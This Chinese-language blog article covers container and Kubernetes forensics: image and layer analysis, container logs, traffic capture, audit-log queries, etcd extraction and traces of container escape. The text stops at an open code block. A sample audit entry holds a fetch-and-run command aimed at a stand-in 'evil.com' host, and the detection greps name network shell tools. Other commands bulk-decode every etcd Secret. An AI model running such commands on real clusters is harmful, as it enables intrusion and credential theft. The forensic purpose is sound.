---
title: "容器与Kubernetes环境取证分析"
date: 2026-06-26T18:00:00+08:00
draft: false
weight: 450
description: "围绕容器和 Kubernetes 环境的取证分析，深入分析 Docker 容器取证（镜像分析/日志提取/网络流量）、Kubernetes 审计日志分析、etcd 数据提取、容器逃逸痕迹、云原生环境 IOC 提取等技术。"
categories: ["应急响应", "取证分析"]
tags: ["Docker", "Kubernetes", "容器取证", "K8s审计日志", "etcd", "容器逃逸", "云原生安全"]
---

# 容器与Kubernetes环境取证分析

容器化和 Kubernetes 编排已经成为现代应用部署的主流方式。然而，容器环境的取证分析与传统主机取证有着本质性的差异——容器的短暂性、镜像的分层结构、编排平台的分布式特性，都为取证工作带来了独特的挑战。传统磁盘镜像和内存转储的方法论在这里需要大幅调整，取而代之的是镜像层分析、容器运行时日志提取、Kubernetes 审计日志关联、etcd 数据库提取等一系列云原生取证技术。

本文聚焦于容器和 Kubernetes 环境的取证分析全流程：从 Docker 镜像结构解析到运行容器快照、从 Kubernetes 审计日志关联分析到 etcd 敏感数据提取、从容器逃逸痕迹识别到自动化检测规则编写。目标是构建一套完整的容器取证方法论，覆盖从单容器到大规模集群的全部取证场景。

---

## 0x01 容器技术基础与安全模型

### 1. Docker 架构

Docker 采用客户端-服务器架构，核心组件包括：

**Docker Daemon（dockerd）**

Docker 守护进程是容器运行时的核心，负责监听 Docker API 请求并管理容器的生命周期。在现代 Docker 版本中，daemon 并不直接管理容器，而是将任务委托给 containerd。

**containerd**

containerd 是一个行业标准的容器运行时，负责管理容器的完整生命周期：镜像拉取和存储、容器执行和监控、底层存储和网络附件。containerd 通过 gRPC API 与 dockerd 通信，并通过 containerd-shim 管理具体的容器进程。

**runc**

runc 是一个轻量级的 OCI（Open Container Initiative）容器运行时，负责根据 OCI 规范创建和运行容器。runc 直接与 Linux 内核交互，利用 namespace 和 cgroup 实现容器隔离。

```bash
docker version --format '{{.Server.Components}}'
```

### 2. 容器 vs 虚拟机的安全差异

容器与虚拟机在隔离机制上存在本质差异：

| 对比维度 | 容器 | 虚拟机 |
|---------|------|--------|
| 隔离层级 | 进程级（共享内核） | 硬件级（独立内核） |
| 攻击面 | 共享内核，内核漏洞影响所有容器 | Hypervisor 攻击面相对较小 |
| 资源隔离 | cgroup 限制，存在资源竞争 | 独立资源，隔离更彻底 |
| 逃逸风险 | 内核漏洞、配置错误可导致逃逸 | 需要突破 Hypervisor |
| 启动速度 | 秒级 | 分钟级 |
| 镜像大小 | MB 级 | GB 级 |

容器共享宿主机内核是安全差异的根本原因。一个容器内的内核漏洞利用可能影响宿主机上的所有容器，这是容器逃逸的根本技术原理。

### 3. 容器安全模型

**Linux Namespace**

Namespace 是容器隔离的核心技术，提供六种隔离能力：

```bash
lsns -t pid -t net -t mnt -t uts -t ipc -t user
```

| Namespace | 隔离内容 | 取证价值 |
|-----------|---------|---------|
| PID | 进程 ID 空间 | 容器内进程不可见于宿主机 |
| Network | 网络栈（IP、路由、端口） | 容器网络独立，需要特殊方法捕获流量 |
| Mount | 文件系统挂载点 | 容器文件系统独立于宿主机 |
| UTS | 主机名和域名 | 容器可独立命名 |
| IPC | 进程间通信 | 容器间 IPC 隔离 |
| User | 用户和组 ID | 容器内 root 映射到宿主机非特权用户 |

**Linux Control Groups (cgroup)**

cgroup 限制容器可使用的资源（CPU、内存、磁盘 I/O、网络带宽）。在取证中，cgroup 可以帮助识别容器的资源使用模式，例如加密挖矿容器通常表现为异常高的 CPU 使用率：

```bash
cat /sys/fs/cgroup/cpu/docker/<container_id>/cpu.stat
cat /sys/fs/cgroup/memory/docker/<container_id>/memory.usage_in_bytes
```

**Linux Capabilities**

Docker 默认赋予容器一组受限的 capabilities。异常的 capability 配置往往是安全风险的信号：

```bash
docker inspect --format '{{.HostConfig.CapAdd}}' <container_id>
```

危险的 capability 组合包括：`CAP_SYS_ADMIN`（近乎完全控制）、`CAP_NET_ADMIN`（网络管理）、`CAP_SYS_PTRACE`（进程跟踪）。

### 4. Kubernetes 架构概述

Kubernetes 是容器编排平台，其核心组件及其取证价值：

| 组件 | 职责 | 取证价值 |
|------|------|---------|
| API Server | 集群网关，所有操作的入口 | 审计日志记录所有 API 调用 |
| etcd | 分布式键值存储，集群状态存储 | 存储所有配置和 Secret 数据 |
| Scheduler | 决定 Pod 运行在哪个节点 | 调度决策日志 |
| Controller Manager | 维护集群期望状态 | 控制器日志 |
| kubelet | 节点代理，管理 Pod 生命周期 | 节点级日志和事件 |

```bash
kubectl cluster-info
kubectl get componentstatuses
kubectl get nodes -o wide
```

### 5. Kubernetes 安全模型

**RBAC（Role-Based Access Control）**

RBAC 定义了谁可以对哪些资源执行哪些操作。在取证中，RBAC 配置审计是识别权限提升和越权访问的关键：

```bash
kubectl get clusterrolebindings -o yaml
kubectl get rolebindings --all-namespaces -o yaml
kubectl auth can-i --list --as=system:serviceaccount:default:compromised-sa
```

**NetworkPolicy**

NetworkPolicy 控制 Pod 间网络通信。异常的 NetworkPolicy 变更（如过于宽松的规则）是攻击者横向移动的前置条件：

```bash
kubectl get networkpolicies --all-namespaces -o yaml
```

**PodSecurityPolicy / Pod Security Admission**

PodSecurityPolicy（已废弃）和 Pod Security Admission 控制 Pod 的安全上下文。关键检查项包括：是否允许特权容器、是否允许 hostNetwork/hostPID/hostIPC、是否限制 capabilities。

---

## 0x02 Docker 容器取证 — 镜像分析

### 1. Docker 镜像结构

Docker 镜像采用分层存储结构，每一层对应 Dockerfile 中的一条指令。理解镜像结构是容器取证的基础。

**Manifest 文件**

Manifest 描述了镜像的层组成和配置：

```bash
docker inspect --format '{{json .Manifests}}' <image_name> | jq .
```

Manifest 示例结构：

```json
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
  "config": {
    "mediaType": "application/vnd.docker.container.image.v1+json",
    "digest": "sha256:a1b2c3d4e5f6...",
    "size": 5283
  },
  "layers": [
    {
      "mediaType": "application/vnd.docker.image.layer.diff.tar.gzip",
      "digest": "sha256:b2c3d4e5f6a7...",
      "size": 7323456
    }
  ]
}
```

**Config 文件**

Config 文件包含镜像的元数据：环境变量、Entrypoint、Cmd、Volumes、WorkingDir、Labels 等。取证中特别关注环境变量（可能包含泄露的凭据）和 Entrypoint/Cmd（可能被篡改为恶意命令）：

```bash
docker inspect <image_name> | jq '.[0].Config'
```

**Layer 存储**

镜像层存储在 `/var/lib/docker/overlay2/` 目录下。每一层包含一个 `diff` 目录（文件系统变更）和一个 `link` 文件（短标识符）：

```bash
ls /var/lib/docker/overlay2/
cat /var/lib/docker/overlay2/<layer_id>/diff/etc/passwd
```

### 2. 镜像内容分析

**文件系统层分析**

逐层检查镜像内容，识别可疑文件：

```bash
container-diff analyze <image_name> --type=file --type=apt --type=pip
```

重点检查项：
- `/etc/crontab`、`/var/spool/cron/` 是否存在定时任务
- `/root/.ssh/` 是否存在未授权的 SSH 密钥
- `/etc/ld.so.preload` 是否存在预加载库
- `/tmp/`、`/dev/shm/` 是否存在可执行文件
- `.bashrc`、`.profile` 是否存在后门命令

**配置分析**

```bash
docker history <image_name> --no-trunc
```

Dockerfile 指令的取证含义：

| 指令 | 取证关注点 |
|------|-----------|
| ENV | 硬编码的凭据、API Key、Token |
| ADD / COPY | 引入的外部文件、恶意脚本 |
| RUN | 安装的软件包、执行的命令 |
| EXPOSE | 开放的端口 |
| ENTRYPOINT / CMD | 容器启动时执行的命令 |
| USER | 运行用户（root 运行是风险信号） |

### 3. 镜像漏洞扫描

漏洞扫描可以辅助判断镜像是否包含已知漏洞，用于评估攻击面：

```bash
trivy image --severity HIGH,CRITICAL <image_name>
grype <image_name> -o json | jq '.matches[] | select(.vulnerability.severity == "Critical")'
```

### 4. 恶意镜像识别

恶意镜像的常见特征：

**加密挖矿**

```bash
docker run --rm <image_name> ps aux | grep -iE 'xmrig|mine|pool|stratum|crypto'
docker run --rm <image_name> cat /etc/crontab
docker run --rm <image_name> find /tmp /dev/shm -name "*.sh" -o -name "*.miner*"
```

**后门**

```bash
docker run --rm --entrypoint="" <image_name> cat /etc/passwd
docker run --rm --entrypoint="" <image_name> ls -la /root/.ssh/
docker run --rm --entrypoint="" <image_name> cat /root/.bashrc
docker run --rm --entrypoint="" <image_name> find / -perm -4000 -type f 2>/dev/null
```

**数据窃取**

检查镜像中是否包含外发数据的脚本或工具：

```bash
docker run --rm --entrypoint="" <image_name> cat /entrypoint.sh
docker run --rm --entrypoint="" <image_name> grep -r "curl\|wget\|nc\|ncat\|socat" / --include="*.sh" --include="*.py" 2>/dev/null
```

### 5. 镜像取证工具

**Dive**

Dive 提供交互式镜像层分析，可以逐层查看文件系统变更：

```bash
dive <image_name>
dive --json report.json <image_name>
```

**Trivy**

Trivy 是综合性的漏洞和配置扫描器：

```bash
trivy image --scanners vuln,misconfig,secret <image_name>
trivy image --format sarif -o report.sarif <image_name>
```

**grype**

grype 是 Anchore 出品的漏洞扫描器，擅长生成 SBOM（软件物料清单）：

```bash
grype <image_name> -o table
syft <image_name> -o spdx-json > sbom.json
```

---

## 0x03 Docker 容器取证 — 运行容器分析

### 1. 运行容器的文件系统取证

运行容器的文件系统是取证的核心证据来源。容器使用 OverlayFS（或类似联合文件系统），取证需要同时分析可写层和只读层：

```bash
docker inspect --format '{{.GraphDriver.Data.MergedDir}}' <container_id>
ls -la $(docker inspect --format '{{.GraphDriver.Data.MergedDir}}' <container_id>)
```

导出容器文件系统进行离线分析：

```bash
docker export <container_id> -o container_fs.tar
mkdir -p /tmp/container_forensics
tar xf container_fs.tar -C /tmp/container_forensics
```

文件系统取证要点：

```bash
find /tmp/container_forensics -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null
find /tmp/container_forensics -newer /tmp/container_forensics/etc/passwd -type f 2>/dev/null
find /tmp/container_forensics -perm -4000 -type f 2>/dev/null
strings /tmp/container_forensics/usr/bin/* 2>/dev/null | grep -iE 'http|ftp|wget|curl|eval|base64'
```

### 2. 容器进程分析

```bash
docker top <container_id> auxf
docker top <container_id> -eo pid,ppid,uid,cmd
```

进程分析关注点：
- 异常的进程树结构（如 nginx 启动了 shell）
- 非预期的父进程关系
- 异常的 UID（如容器内 root 对应宿主机非 root）
- 命令行参数中的可疑内容（编码的命令、远程 IP 地址）

从宿主机查看容器进程的完整信息：

```bash
ps aux | grep $(docker inspect --format '{{.State.Pid}}' <container_id>)
ls -la /proc/$(docker inspect --format '{{.State.Pid}}' <container_id>)/exe
cat /proc/$(docker inspect --format '{{.State.Pid}}' <container_id>)/cmdline | tr '\0' ' '
cat /proc/$(docker inspect --format '{{.State.Pid}}' <container_id>)/environ | tr '\0' '\n'
```

### 3. 容器网络配置分析

```bash
docker inspect --format '{{json .NetworkSettings}}' <container_id> | jq .
docker inspect --format '{{.NetworkSettings.IPAddress}}' <container_id>
docker port <container_id>
```

网络配置取证要点：
- 检查容器是否使用 host 网络模式（共享宿主机网络栈）
- 检查端口映射是否暴露了不必要的服务
- 检查容器的 DNS 配置是否指向异常的 DNS 服务器

### 4. 容器环境变量和挂载点分析

环境变量中经常包含敏感凭据：

```bash
docker inspect --format '{{json .Config.Env}}' <container_id> | jq .
docker inspect --format '{{json .Mounts}}' <container_id> | jq .
```

挂载点分析的关键点：
- 宿主机目录挂载到容器内（`/var/run/docker.sock` 挂载是严重风险）
- 敏感目录的读写挂载（`/etc`、`/root`、`/proc`）
- Docker Socket 挂载（可能导致容器逃逸）

```bash
docker inspect --format '{{range .Mounts}}{{.Source}} -> {{.Destination}} ({{.Mode}})
{{end}}' <container_id>
```

### 5. 容器快照和导出

创建容器的取证快照：

```bash
docker commit <container_id> forensic_snapshot_$(date +%Y%m%d_%H%M%S)
docker save <image_name> -o forensic_image_$(date +%Y%m%d_%H%M%S).tar
docker export <container_id> -o container_fs_$(date +%Y%m%d_%H%M%S).tar
```

`docker commit` 保存完整的容器状态（包括运行时的文件系统变更），`docker save` 保存镜像及其所有层，`docker export` 仅导出容器的文件系统快照（不含元数据和层信息）。

### 6. 取证工具链

| 工具 | 用途 | 命令示例 |
|------|------|---------|
| DockerSlim | 容器镜像分析和瘦身 | `slim inspect <image_name>` |
| Notary | 镜像签名验证 | `notary verify <image_name>` |
| Clair | 静态漏洞分析 | `clair-scanner --clair=<url> <image>` |
| Sysdig | 容器运行时监控 | `sysdig -pc container.name=<name>` |
| Falco | 运行时威胁检测 | `falco -r /etc/falco/rules.yaml` |
| Peirates | 容器渗透测试 | `peirates -i <container>` |

---

## 0x04 Docker 容器取证 — 日志与事件分析

### 1. Docker 日志驱动

Docker 支持多种日志驱动，取证中需要根据实际配置选择对应的分析方法：

**json-file**

默认的日志驱动，日志以 JSON 格式存储在宿主机上：

```bash
cat /var/lib/docker/containers/<container_id>/<container_id>-json.log
docker logs --since "2026-06-01T00:00:00" --until "2026-06-02T00:00:00" <container_id>
```

**syslog**

日志发送到 syslog 服务：

```bash
grep <container_name> /var/log/syslog
grep <container_name> /var/log/messages
```

**journald**

日志发送到 systemd journal：

```bash
journalctl -u docker CONTAINER_NAME=<container_id> --since "2026-06-01"
journalctl CONTAINER_ID=<short_id> --since "2026-06-01T00:00:00" --until "2026-06-02T00:00:00"
```

### 2. Docker 事件日志

Docker 事件记录了容器生命周期中的所有操作：

```bash
docker events --since "2026-06-01T00:00:00" --until "2026-06-02T00:00:00" --format '{{json .}}' | jq .
```

关键事件类型：

| 事件类型 | 取证含义 |
|---------|---------|
| container create | 容器创建（可疑容器出现） |
| container start | 容器启动 |
| container stop | 容器停止（可能试图销毁证据） |
| container destroy | 容器销毁 |
| image pull | 镜像拉取（新镜像引入） |
| image push | 镜像推送（数据外泄通道） |
| container exec | 在运行容器中执行命令（高风险操作） |
| container attach | 附加到容器控制台 |

```bash
docker events --filter 'type=container' --filter 'event=exec_start' --format '{{.Time}} {{.Actor.Attributes.name}} {{.Action}}' | jq .
```

### 3. containerd 日志分析

在使用 containerd 直接管理容器的环境中（如 Kubernetes），需要分析 containerd 日志：

```bash
journalctl -u containerd --since "2026-06-01T00:00:00" --until "2026-06-02T00:00:00"
cat /var/log/containerd/containerd.log
```

containerd 日志中的取证要点：
- 镜像拉取事件和来源地址
- 容器创建和启动事件
- 容器运行时错误（可能表示攻击失败的痕迹）
- gRPC 调用记录

### 4. 容器运行时审计

使用 auditd 监控 Docker 相关的系统调用：

```bash
cat /etc/audit/rules.d/docker.rules
```

审计规则示例：

```bash
-w /usr/bin/docker -p rwxa -k docker
-w /var/lib/docker -p rwxa -k docker
-w /etc/docker -p rwxa -k docker
-w /usr/lib/systemd/system/docker.service -p rwxa -k docker
-w /usr/lib/systemd/system/docker.socket -p rwxa -k docker
-w /etc/default/docker -p rwxa -k docker
-w /etc/docker/daemon.json -p rwxa -k docker
-w /etc/containerd/config.toml -p rwxa -k docker
-w /var/run/docker.sock -p rwxa -k docker
```

查询审计日志：

```bash
ausearch -k docker -ts recent
ausearch -k docker --start "2026-06-01 00:00:00" --end "2026-06-02 00:00:00"
aureport -k --start "2026-06-01" --end "2026-06-02"
```

### 5. 日志持久化和集中收集方案

生产环境建议将容器日志发送到集中式日志平台：

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: fluentd-config
  namespace: logging
data:
  fluent.conf: |
    <source>
      @type tail
      path /var/log/containers/*.log
      pos_file /var/log/fluentd-containers.log.pos
      tag kubernetes.*
      read_from_head true
      <parse>
        @type json
        time_key time
        time_format %Y-%m-%dT%H:%M:%S.%NZ
      </parse>
    </source>
    <filter kubernetes.**>
      @type kubernetes_metadata
    </filter>
    <match **>
      @type elasticsearch
      host elasticsearch.logging.svc.cluster.local
      port 9200
      logstash_format true
      logstash_prefix container-logs
    </match>
```

---

## 0x05 Docker 容器取证 — 网络流量分析

### 1. 容器网络模式

Docker 支持多种网络模式，每种模式对取证方法有不同影响：

**bridge 模式（默认）**

容器通过 Docker 网桥（docker0）与外部通信。流量可以通过网桥上的 veth pair 进行捕获：

```bash
brctl show docker0
tcpdump -i docker0 -w container_traffic.pcap
```

**host 模式**

容器直接使用宿主机网络栈，没有网络隔离。流量捕获方法与宿主机相同：

```bash
tcpdump -i eth0 -w host_mode_traffic.pcap
```

**overlay 模式**

用于跨主机容器通信（Docker Swarm 或 Kubernetes）。需要在各个节点上分别捕获流量。

**macvlan 模式**

容器拥有独立的 MAC 地址，直接连接到物理网络。流量捕获需要在物理交换机或网络 TAP 上进行。

### 2. 容器网络流量捕获

在运行的容器中安装 tcpdump 进行流量捕获：

```bash
docker exec -it <container_id> sh -c "apt-get update && apt-get install -y tcpdump"
docker exec -it <container_id> tcpdump -i eth0 -w /tmp/traffic.pcap
docker cp <container_id>:/tmp/traffic.pcap ./evidence/traffic.pcap
```

在宿主机上通过 veth pair 捕获容器流量：

```bash
VETH=$(docker inspect --format '{{range .NetworkSettings.Networks}}{{.EndpointID}}{{end}}' <container_id>)
tcpdump -i $(brctl show | grep $VETH | awk '{print $1}') -w container_veth_traffic.pcap
```

使用 nsenter 进入容器的网络命名空间进行捕获：

```bash
PID=$(docker inspect --format '{{.State.Pid}}' <container_id>)
nsenter -t $PID -n tcpdump -i eth0 -w /tmp/container_ns_traffic.pcap
```

### 3. 容器间通信分析

分析容器间通信模式：

```bash
docker network inspect bridge | jq '.[0].Containers'
```

使用 iptables 追踪容器间通信：

```bash
iptables -L DOCKER -v -n
iptables -t nat -L DOCKER -v -n
```

### 4. CNI 插件网络取证

在 Kubernetes 环境中，CNI（Container Network Interface）插件负责 Pod 间网络通信。不同插件的取证方法：

**Calico**

```bash
calicoctl node status
calicoctl get policy -o yaml
calicoctl get workloadendpoints -o wide
```

**Flannel**

```bash
cat /run/flannel/subnet.env
ip route | grep flannel
cat /var/lib/calico/infocfg.json
```

**Cilium**

Cilium 提供了强大的网络可见性：

```bash
cilium status
cilium policy get
cilium endpoint list
cilium monitor --type drop
```

### 5. Service Mesh 流量分析

Service Mesh（如 Istio、Linkerd）在数据平面通过 sidecar 代理拦截所有流量。

**Istio**

```bash
istioctl proxy-status
istioctl proxy-config routes <pod_name>
istioctl proxy-config clusters <pod_name>
kubectl logs <pod_name> -c istio-proxy --tail=1000
```

**Linkerd**

```bash
linkerd stat deployments --all-namespaces
linkerd top pods --all-namespaces
linkerd tap deployment/<name> --max-rps 100
```

Service Mesh 环境的流量分析要点：
- Sidecar 代理的日志包含了所有经过的 HTTP/gRPC 请求
- mTLS 证书可以用于验证服务间通信的真实性
- 访问日志中的异常请求模式（如高频请求、异常路径、大流量传输）

---

## 0x06 Kubernetes 审计日志分析

### 1. K8s 审计策略配置

Kubernetes 审计策略定义了哪些 API 操作需要被记录以及记录的详细程度：

```yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["secrets", "configmaps"]
    verbs: ["get", "list", "watch", "create", "update", "patch"]
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["pods"]
    verbs: ["create", "delete", "patch", "update"]
  - level: Metadata
    resources:
      - group: ""
        resources: ["pods/log", "pods/status"]
  - level: None
    resources:
      - group: "metrics.k8s.io"
    verbs: ["get", "list"]
  - level: Metadata
    nonResourceURLs: ["/healthz*", "/version"]
```

审计级别说明：

| 级别 | 内容 | 取证价值 |
|------|------|---------|
| None | 不记录 | - |
| Metadata | 仅记录请求元数据（用户、时间、资源） | 基本审计追踪 |
| Request | 记录元数据 + 请求体 | 追踪配置变更 |
| RequestResponse | 记录元数据 + 请求体 + 响应体 | 完整取证记录 |

### 2. 审计日志格式和字段

审计日志的每条记录包含以下关键字段：

```json
{
  "kind": "Event",
  "apiVersion": "audit.k8s.io/v1",
  "level": "RequestResponse",
  "auditID": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "stage": "ResponseComplete",
  "requestURI": "/api/v1/namespaces/default/pods",
  "verb": "create",
  "user": {
    "username": "system:serviceaccount:default:compromised-sa",
    "uid": "12345-abcde",
    "groups": ["system:serviceaccounts", "system:serviceaccounts:default"]
  },
  "sourceIPs": ["10.0.0.100"],
  "userAgent": "kubectl/v1.28.0",
  "objectRef": {
    "resource": "pods",
    "namespace": "default",
    "name": "suspicious-pod"
  },
  "responseStatus": {
    "code": 201
  },
  "requestReceivedTimestamp": "2026-06-01T10:00:00.000000Z",
  "stageTimestamp": "2026-06-01T10:00:00.100000Z",
  "requestObject": {
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": { "name": "suspicious-pod" },
    "spec": {
      "containers": [{
        "name": "main",
        "image": "malicious:latest",
        "command": ["/bin/sh", "-c", "curl http://evil.com/steal.sh | sh"]
      }]
    }
  }
}
```

### 3. 事件类型

| 阶段 | 含义 | 取证用途 |
|------|------|---------|
| RequestReceived | API Server 收到请求 | 攻击时间线起点 |
| ResponseStarted | 开始发送响应（长时间操作） | 流式操作追踪 |
| ResponseComplete | 响应发送完成 | 操作完成确认 |
| Panic | API Server 内部错误 | 可能表示攻击触发了异常 |

### 4. 关键 API 操作审计

**Pod 创建（可疑容器）**

```bash
cat /var/log/kubernetes/audit/audit.log | jq 'select(.verb == "create" and .objectRef.resource == "pods" and .user.username != "system:kube-scheduler")'
```

**Pod exec（命令执行）**

```bash
cat /var/log/kubernetes/audit/audit.log | jq 'select(.verb == "create" and .objectRef.resource == "pods/exec")'
```

**Secret 访问**

```bash
cat /var/log/kubernetes/audit/audit.log | jq 'select(.verb == "get" and .objectRef.resource == "secrets")'
```

**端口转发**

```bash
cat /var/log/kubernetes/audit/audit.log | jq 'select(.requestURI | startswith("/api/v1/namespaces/") and contains("portforward"))'
```

### 5. 审计日志查询和分析

**ELK Stack 集成**

使用 Filebeat 采集审计日志：

```yaml
filebeat.inputs:
  - type: log
    enabled: true
    paths:
      - /var/log/kubernetes/audit/audit.log
    json.keys_under_root: true
    json.add_error_key: true

output.elasticsearch:
  hosts: ["elasticsearch:9200"]
  index: "k8s-audit-%{+yyyy.MM.dd}"
```

使用 KQL 查询可疑操作：

```bash
# 查找非 kube-system 命名空间中的 Secret 访问
kibana_context: |
  query: |
    verb:("get" or "list" or "watch") AND objectRef.resource:"secrets" AND NOT user.username:("system:*")
  filters:
    - range:
        requestReceivedTimestamp:
          gte: "2026-06-01T00:00:00"
          lte: "2026-06-02T00:00:00"
```

---

## 0x07 Kubernetes 安全事件取证

### 1. RBAC 配置审计和权限提升检测

检查过度宽松的 ClusterRoleBinding：

```bash
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | "Subject: \(.subjects // [] | map(.name) | join(", ")) | Binding: \(.metadata.name)"'
```

检查权限提升路径：

```bash
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl auth can-i create pods --as=system:serviceaccount:default:default --all-namespaces
kubectl auth can-i get secrets --as=system:serviceaccount:default:default --all-namespaces
```

### 2. 异常 Pod 创建分析

识别可疑的 Pod 创建模式：

```bash
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged == true or .spec.hostNetwork == true or .spec.hostPID == true or .spec.hostIPC == true) | "\(.metadata.namespace)/\(.metadata.name) privileged:\(.spec.containers[].securityContext.privileged // false) hostNetwork:\(.spec.hostNetwork // false) hostPID:\(.spec.hostPID // false)"'
```

检查异常的 Pod 镜像来源：

```bash
kubectl get pods --all-namespaces -o json | jq -r '.items[] | .spec.containers[] | select(.image | test("^(?!registry\\.k8s\\.io|docker\\.io|gcr\\.io).*$")) | "\(.image)"' | sort -u
```

### 3. ServiceAccount 令牌滥用检测

检查所有 ServiceAccount 的 Secret 持有情况：

```bash
kubectl get serviceaccounts --all-namespaces -o json | jq -r '.items[] | select(.secrets | length > 0) | "\(.metadata.namespace)/\(.metadata.name) secrets: \(.secrets | length)"'
```

检查 ServiceAccount 是否关联了 ClusterRole：

```bash
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.kind == "ServiceAccount") | {binding: .metadata.name, role: .roleRef.name, subjects: [.subjects[]? | select(.kind == "ServiceAccount") | "\(.namespace)/\(.name)"]}'
```

### 4. 异常 kubectl exec 操作检测

通过审计日志检测 exec 操作：

```bash
cat /var/log/kubernetes/audit/audit.log | jq 'select(.requestURI | test("/api/v1/namespaces/.+/pods/.+/exec")) | {user: .user.username, namespace: .objectRef.namespace, pod: .objectRef.name, time: .requestReceivedTimestamp, responseCode: .responseStatus.code}'
```

检查活跃的 exec session：

```bash
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.status.containerStatuses[]?.state.waiting != null) | "\(.metadata.namespace)/\(.metadata.name) waiting: \(.status.containerStatuses[].state.waiting.reason)"'
```

### 5. 凭据窃取（Secret 访问）分析

列出所有 Secret 及其使用情况：

```bash
kubectl get secrets --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name) type:\(.type)"'
```

检查通过 Volume 挂载的 Secret：

```bash
kubectl get pods --all-namespaces -o json | jq -r '.items[] | select(.spec.volumes[]?.secret != null) | "\(.metadata.namespace)/\(.metadata.name) mounts: \([.spec.volumes[]? | select(.secret != null) | .secret.secretName] | join(", "))"'
```

### 6. 网络策略绕过检测

检查是否有命名空间缺少 NetworkPolicy：

```bash
for ns in $(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}'); do
  policy_count=$(kubectl get networkpolicies -n $ns --no-headers 2>/dev/null | wc -l)
  if [ "$policy_count" -eq 0 ]; then
    echo "WARNING: namespace $ns has no NetworkPolicy"
  fi
done
```

---

## 0x08 etcd 数据提取与分析

### 1. etcd 架构和数据结构

etcd 是 Kubernetes 的核心数据存储，保存了集群的所有状态信息：Pod、Service、Secret、ConfigMap、RBAC 等。

etcd 数据目录默认位于 `/var/lib/etcd/`，包含以下关键文件：

```bash
ls -la /var/lib/etcd/
ls -la /var/lib/etcd/member/snap/
ls -la /var/lib/etcd/member/wal/
```

### 2. etcd 数据存储格式

etcd 使用 BoltDB 作为后端存储引擎，数据以 key-value 形式存储：

```bash
etcdctl get / --prefix --keys-only | head -50
etcdctl get / --prefix --keys-only | wc -l
```

Kubernetes 在 etcd 中的 key 路径结构：

```
/registry/pods/<namespace>/<name>
/registry/secrets/<namespace>/<name>
/registry/services/specs/<namespace>/<name>
/registry/serviceaccounts/<namespace>/<name>
/registry/clusterrolebindings/<name>
/registry/roles/<namespace>/<name>
```

### 3. etcd 认证与访问控制

etcd 的访问控制是集群安全的关键：

```bash
etcdctl endpoint health --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key
```

检查 etcd 是否启用了认证：

```bash
etcdctl auth status --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key
```

### 4. 从 etcd 提取 Kubernetes 配置

```bash
etcdctl get /registry/pods --prefix --keys-only
etcdctl get /registry/deployments --prefix --keys-only
etcdctl get /registry/services --prefix --keys-only
```

导出完整的 Kubernetes 资源清单：

```bash
for resource in pods deployments services configmaps secrets serviceaccounts roles rolebindings clusterrolebindings; do
  etcdctl get /registry/$resource --prefix --print-value-only > /tmp/etcd_export_${resource}.yaml 2>/dev/null
  echo "Exported $resource"
done
```

### 5. 从 etcd 提取 Secret 数据

Secret 在 etcd 中以 base64 编码存储：

```bash
etcdctl get /registry/secrets/default/my-secret --print-value-only | base64 -d
```

批量提取所有 Secret：

```bash
etcdctl get /registry/secrets --prefix --keys-only | while read key; do
  echo "=== $key ==="
  etcdctl get "$key" --print-value-only | base64 -d 2>/dev/null || echo "(binary data)"
done
```

### 6. etcd 备份和恢复分析

检查 etcd 备份是否存在被篡改的痕迹：

```bash
ls -la /var/lib/etcd/member/snap/
file /var/lib/etcd/member/snap/db
```

手动创建 etcd 快照用于取证：

```bash
etcdctl snapshot save /tmp/etcd_snapshot_$(date +%Y%m%d_%H%M%S).db --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key
etcdctl snapshot status /tmp/etcd_snapshot.db --write-table
```

---

## 0x09 容器逃逸痕迹取证

### 1. 容器逃逸技术概述

容器逃逸是指突破容器隔离边界，获得宿主机或更高权限的技术。常见逃逸途径：

**内核漏洞利用**

利用 Linux 内核漏洞（如 CVE-2022-0185、CVE-2022-0492、CVE-2024-21625）实现逃逸。

**配置错误**

- 特权容器（`--privileged`）
- 挂载 Docker Socket（`-v /var/run/docker.sock:/var/run/docker.sock`）
- 挂载宿主机文件系统（`-v /:/host`）
- 使用 `--pid=host` 或 `--net=host`
- 危险的 Linux Capabilities（`SYS_ADMIN`、`SYS_PTRACE`）

**应用漏洞**

容器内运行的应用漏洞（如 Struts2、Log4j）可能被利用进行逃逸。

### 2. 逃逸痕迹识别

**异常进程**

```bash
ps auxf | grep -E 'nsenter|chroot|unshare|mount|/proc/1'
cat /proc/1/cgroup | grep -v docker
ls -la /proc/*/root | grep -E 'docker|kubepods' | head -20
```

**文件系统挂载异常**

```bash
mount | grep -E 'overlay|proc|sysfs' | grep -v 'docker\|kubepods'
find /mnt -maxdepth 3 -name "shadow" -o -name "passwd" 2>/dev/null
ls -la /host/ 2>/dev/null
```

**网络连接异常**

```bash
ss -tlnp | grep -v docker
ss -tlnp | grep -E '4444|4445|1234|8888|9999'
netstat -antp | grep ESTABLISHED | awk '{print $5}' | sort -u
```

### 3. 从宿主机日志中检测容器逃逸

检查 dmesg 中的内核日志：

```bash
dmesg | grep -iE 'segfault|general protection|container|escap'
dmesg | grep -iE 'apparmor|selinux|seccomp' | grep -i denied
```

检查审计日志中的异常系统调用：

```bash
